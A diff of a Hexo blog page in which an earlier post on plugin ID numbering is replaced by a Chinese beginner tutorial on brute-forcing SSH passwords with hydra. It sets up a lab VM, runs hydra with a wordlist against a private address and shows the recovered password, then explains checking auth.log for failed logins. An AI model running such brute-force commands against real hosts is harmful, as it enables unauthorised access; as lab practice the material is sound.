@@ -19,23 +19,23 @@
   <meta name="author" content="ljw">
   <meta name="keywords" content="博客,blog">
   
-    <meta name="description" content="我想要更简洁的hexo永久链接,于是安装了hexo-abbrlink2插件,可是在hexo clean之后,文章与ID对应完全混乱  插件逻辑第一级:最高优先级  Front-matter(头文件)1if (data.abbrlink) &#123; return data; &#125; 可见如果.md文件顶部写了abbrlink: 26,插件直接将此ID分配给文章 第二级:文章级缓存 db.">
+    <meta name="description" content="一，适用场景弱密码 开启ssh 二， 基本原理使用暴力破解密码工具hydra中的ssh密码破解工具 hydra -l [user] -P [字典] ssh:&#x2F;&#x2F;[ip] 三，实战准备 靶机开启ssh123sudo apt install openssh-serversudo systemctl start sshd  #启用sudo systemctl enable sshd">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于hexo-abbrlink2生成的数字ID混乱问题">
-<meta property="og:url" content="https://yiwan.fan/posts/2/index.html">
+<meta property="og:title" content="ssh枚举爆破密码">
+<meta property="og:url" content="https://yiwan.fan/posts/3/index.html">
 <meta property="og:site_name" content="一碗饭">
-<meta property="og:description" content="我想要更简洁的hexo永久链接,于是安装了hexo-abbrlink2插件,可是在hexo clean之后,文章与ID对应完全混乱  插件逻辑第一级:最高优先级  Front-matter(头文件)1if (data.abbrlink) &#123; return data; &#125; 可见如果.md文件顶部写了abbrlink: 26,插件直接将此ID分配给文章 第二级:文章级缓存 db.">
+<meta property="og:description" content="一，适用场景弱密码 开启ssh 二， 基本原理使用暴力破解密码工具hydra中的ssh密码破解工具 hydra -l [user] -P [字典] ssh:&#x2F;&#x2F;[ip] 三，实战准备 靶机开启ssh123sudo apt install openssh-serversudo systemctl start sshd  #启用sudo systemctl enable sshd">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-07-27T03:07:06.000Z">
-<meta property="article:modified_time" content="2026-07-27T04:30:54.679Z">
+<meta property="article:published_time" content="2026-07-28T00:00:50.000Z">
+<meta property="article:modified_time" content="2026-07-28T00:02:54.353Z">
 <meta property="article:author" content="ljw">
-<meta property="article:tag" content="hexo">
-<meta property="article:tag" content="问题解决">
+<meta property="article:tag" content="ssh">
+<meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>关于hexo-abbrlink2生成的数字ID混乱问题 - 一碗饭</title>
+  <title>ssh枚举爆破密码 - 一碗饭</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -304,7 +304,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="关于hexo-abbrlink2生成的数字ID混乱问题"></span>
+            <span id="subtitle" data-typed-text="ssh枚举爆破密码"></span>
           
         </div>
 
@@ -315,8 +315,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-07-27 11:07" pubdate>
-          2026年7月27日 上午
+        <time datetime="2026-07-28 08:00" pubdate>
+          2026年7月28日 早上
         </time>
       </span>
     
@@ -327,7 +327,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          915 字
+          1.4k 字
         
       </span>
     
@@ -338,7 +338,7 @@
         
         
         
-          8 分钟
+          12 分钟
         
       </span>
     
@@ -377,25 +377,53 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">关于hexo-abbrlink2生成的数字ID混乱问题</h1>
+            <h1 id="seo-header">ssh枚举爆破密码</h1>
             
             
               <div class="markdown-body">
                 
-                <blockquote>
-<p>我想要更简洁的hexo永久链接,于是安装了hexo-abbrlink2插件,可是在<code>hexo clean</code>之后,文章与ID对应完全混乱</p>
-</blockquote>
-<h2 id="插件逻辑"><a href="#插件逻辑" class="headerlink" title="插件逻辑"></a>插件逻辑</h2><h4 id="第一级-最高优先级-Front-matter-头文件"><a href="#第一级-最高优先级-Front-matter-头文件" class="headerlink" title="第一级:最高优先级  Front-matter(头文件)"></a>第一级:最高优先级  Front-matter(头文件)</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (data.<span class="hljs-property">abbrlink</span>) &#123; <span class="hljs-keyword">return</span> data; &#125;<br></code></pre></td></tr></table></figure>
-<p>可见如果.md文件顶部写了<code>abbrlink: 26</code>,插件直接将此ID分配给文章</p>
-<h4 id="第二级-文章级缓存-db-json-中的文章记录（软固定）"><a href="#第二级-文章级缓存-db-json-中的文章记录（软固定）" class="headerlink" title="第二级:文章级缓存 db.json 中的文章记录（软固定）"></a>第二级:文章级缓存 db.json 中的文章记录（软固定）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> cache = model.<span class="hljs-title function_">findById</span>(data.<span class="hljs-property">_id</span>);<br><span class="hljs-keyword">if</span> (cache &amp;&amp; <span class="hljs-keyword">typeof</span> cache.<span class="hljs-property">maxid</span> === <span class="hljs-string">&#x27;number&#x27;</span>) &#123; data.<span class="hljs-property">abbrlink</span> = cache.<span class="hljs-property">maxid</span>; <span class="hljs-keyword">return</span> data; &#125;<br></code></pre></td></tr></table></figure>
-<p>如果 Front-matter 里没写,插件就去 db.json 里找,看这篇文章以前是否被分配过 ID</p>
-<p><code>hexo clean</code>后,db.json被删除,本级无法找到ID</p>
-<h4 id="第三级-db-json读取目前分配过的最大ID-1"><a href="#第三级-db-json读取目前分配过的最大ID-1" class="headerlink" title="第三级:db.json读取目前分配过的最大ID+1"></a>第三级:db.json读取目前分配过的最大ID+1</h4><p>插件去 db.json 里找一个特殊记录（键名为 c-thiskeyusingbyabbrlink2），这个记录是分配过的最大 ID。</p>
-<p><code>hexo clean</code>后,db.json被删除,本级无法找到ID</p>
-<h4 id="第四级-config-yml里设置的start值"><a href="#第四级-config-yml里设置的start值" class="headerlink" title="第四级: _config.yml里设置的start值"></a>第四级: _config.yml里设置的start值</h4><p><code>hexo clean</code>后,原有的对应关系丢失,这时如果<code>hexo new</code>就会导致新文章的ID再次从start+1开始,同时,就算不新建博客,当<code>hexo clean</code>删除了db.json，且文章 Front-matter 中没有abbrlink字段时，再次<code>hexo g</code>会因为文件读取顺序的不确定性导致 ID 对应关系混乱。</p>
-<h2 id="解决措施"><a href="#解决措施" class="headerlink" title="解决措施"></a>解决措施</h2><p>不能不用hexo clean,于是在每篇文章的头文件中添加abbrlink: ID即可</p>
-<p>为了每次new一个新文件,让他的头文件中都自带<code>abbrlink:</code>,可以修改scaffolds目录(文章模板)下的post.md</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: &#123;&#123; title &#125;&#125;<br>date: &#123;&#123; date &#125;&#125;<br>tags: <br><span class="hljs-section">abbrlink: </span><br><span class="hljs-section">---</span><br></code></pre></td></tr></table></figure>
+                <h1 id="一，适用场景"><a href="#一，适用场景" class="headerlink" title="一，适用场景"></a>一，适用场景</h1><p><strong>弱密码 开启ssh</strong></p>
+<h1 id="二，-基本原理"><a href="#二，-基本原理" class="headerlink" title="二， 基本原理"></a>二， 基本原理</h1><p>使用暴力破解密码工具hydra中的ssh密码破解工具</p>
+<p>hydra -l [user] -P [字典] ssh:&#x2F;&#x2F;[ip]</p>
+<h1 id="三，实战"><a href="#三，实战" class="headerlink" title="三，实战"></a>三，实战</h1><h2 id="准备-靶机开启ssh"><a href="#准备-靶机开启ssh" class="headerlink" title="准备 靶机开启ssh"></a>准备 靶机开启ssh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install openssh-server<br><span class="hljs-built_in">sudo</span> systemctl start sshd  <span class="hljs-comment">#启用</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> sshd  <span class="hljs-comment">#开机自启</span><br></code></pre></td></tr></table></figure>
+<h2 id="攻击端"><a href="#攻击端" class="headerlink" title="攻击端"></a>攻击端</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hydra -l ljw -P passlist<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.182.128</span><br></code></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ljw@ljw:~/桌面$ hydra -l ljw -P passlist.txt ssh://<span class="hljs-number">192.168</span><span class="hljs-number">.182</span><span class="hljs-number">.128</span><br><br>Hydra v9<span class="hljs-number">.6</span> (c) <span class="hljs-number">2023</span> <span class="hljs-keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2026</span><span class="hljs-number">-07</span><span class="hljs-number">-12</span> <span class="hljs-number">21</span>:<span class="hljs-number">53</span>:<span class="hljs-number">08</span><br>[<span class="hljs-built_in">WARNING</span>] Many SSH configurations <span class="hljs-keyword">limit</span> the number <span class="hljs-keyword">of</span> parallel tasks, it <span class="hljs-keyword">is</span> recommended <span class="hljs-keyword">to</span> reduce the tasks: use -t <span class="hljs-number">4</span><br>[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">42</span> <span class="hljs-keyword">login</span> tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">42</span>), ~<span class="hljs-number">3</span> tries per task<br>[DATA] attacking ssh://<span class="hljs-number">192.168</span><span class="hljs-number">.182</span><span class="hljs-number">.128</span>:<span class="hljs-number">22</span>/<br>[<span class="hljs-number">22</span>][ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.182</span><span class="hljs-number">.128</span>   <span class="hljs-keyword">login</span>: ljw   <span class="hljs-keyword">password</span>: lljjww123<br><span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> <span class="hljs-keyword">valid</span> <span class="hljs-keyword">password</span> <span class="hljs-built_in">found</span><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2026</span><span class="hljs-number">-07</span><span class="hljs-number">-12</span> <span class="hljs-number">21</span>:<span class="hljs-number">53</span>:<span class="hljs-number">18</span><br></code></pre></td></tr></table></figure>
+<h1 id="四，扩展"><a href="#四，扩展" class="headerlink" title="四，扩展"></a>四，扩展</h1><h2 id="1-ssh日志"><a href="#1-ssh日志" class="headerlink" title="1.ssh日志"></a>1.ssh日志</h2><p><strong>var&#x2F;log&#x2F;auth.log</strong> linux身份验证日志</p>
+<p><code>sudo cat /var/log/auth.log </code></p>
+<h2 id="2-cat是什么-，-tail-vim"><a href="#2-cat是什么-，-tail-vim" class="headerlink" title="2.cat是什么 ， tail vim?"></a>2.cat是什么 ， tail vim?</h2><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>核心用途</th>
+<th>文件读取方式</th>
+<th>能否编辑文件</th>
+<th>适合攻防场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cat</td>
+<td>一次性完整打印文件全部内容到终端</td>
+<td>一次性加载全部输出</td>
+<td>❌ 只读，无法修改</td>
+<td>查看小文件、日志片段、字典、sshd_config短配置</td>
+</tr>
+<tr>
+<td>tail</td>
+<td>只读取文件末尾内容，支持实时刷新</td>
+<td>读取尾部，可持续监听新增行</td>
+<td>❌ 只读</td>
+<td>实时监控SSH爆破日志、攻击行为、fail2ban告警</td>
+</tr>
+<tr>
+<td>vim</td>
+<td>文本编辑器，查看+修改文件</td>
+<td>分页加载大文件</td>
+<td>✅ 完整读写编辑</td>
+<td>修改靶机配置、编写字典、写Shell脚本、编辑sshd限制</td>
+</tr>
+</tbody></table>
+<h2 id="3-cat如何筛选？"><a href="#3-cat如何筛选？" class="headerlink" title="3.cat如何筛选？"></a>3.cat如何筛选？</h2><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>在 Linux 中，竖杠 | 被称为管道符，用于将一个命令的输出作为另一个命令的输入<br>sudo cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “Failed”<br>筛选含有Failed的行</p>
 
                 
               </div>
@@ -408,9 +436,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/hexo/" class="print-no-link">#hexo</a>
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="print-no-link">#网络安全</a>
       
-        <a href="/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" class="print-no-link">#问题解决</a>
+        <a href="/tags/ssh/" class="print-no-link">#ssh</a>
       
     </div>
   
@@ -422,8 +450,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>关于hexo-abbrlink2生成的数字ID混乱问题</div>
-      <div>https://yiwan.fan/posts/2/</div>
+      <div>ssh枚举爆破密码</div>
+      <div>https://yiwan.fan/posts/3/</div>
     </div>
     <div class="license-meta">
       
@@ -435,7 +463,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年7月27日</div>
+          <div>2026年7月28日</div>
         </div>
       
       
@@ -467,18 +495,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/3/" title="ssh枚举爆破密码">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ssh枚举爆破密码</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/1/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/posts/2/" title="关于hexo-abbrlink2生成的数字ID混乱问题">
+                        <span class="hidden-mobile">关于hexo-abbrlink2生成的数字ID混乱问题</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
